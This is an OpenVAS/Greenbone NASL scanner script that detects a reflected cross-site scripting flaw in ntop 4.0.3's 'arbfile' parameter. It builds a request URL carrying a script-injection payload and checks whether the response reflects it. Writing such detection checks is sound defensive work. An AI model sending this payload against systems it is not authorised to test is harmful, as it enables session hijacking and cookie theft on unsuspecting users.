# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ntop:ntop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103531");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_version("2025-09-05T15:40:40+0000");

  script_name("ntop 'arbfile' Parameter XSS Vulnerability");

  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2012-08-07 11:41:07 +0200 (Tue, 07 Aug 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("ntop_detect.nasl");
  script_mandatory_keys("ntop/installed");
  script_require_ports("Services/www", 3000);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54792");
  script_xref(name:"URL", value:"http://www.ntop.org/ntop.html");

  script_tag(name:"solution", value:"Reportedly the issue is fixed, however Symantec has not confirmed
  this. Please contact the vendor for more information.");

  script_tag(name:"summary", value:"ntop is prone to a cross-site scripting vulnerability because it fails
  to sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and to launch other attacks.");

  script_tag(name:"affected", value:"ntop 4.0.3 is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/plugins/rrdPlugin?action=arbreq&which=graph&arbfile=TEST"><script>alert(/xss-test/)</script>&arbiface=eth0&start=1343344529&end=1343348129&counter=&title=Active+End+Nodes&mode=zoom';

if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"<script>alert\(/xss-test/\)</script>" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
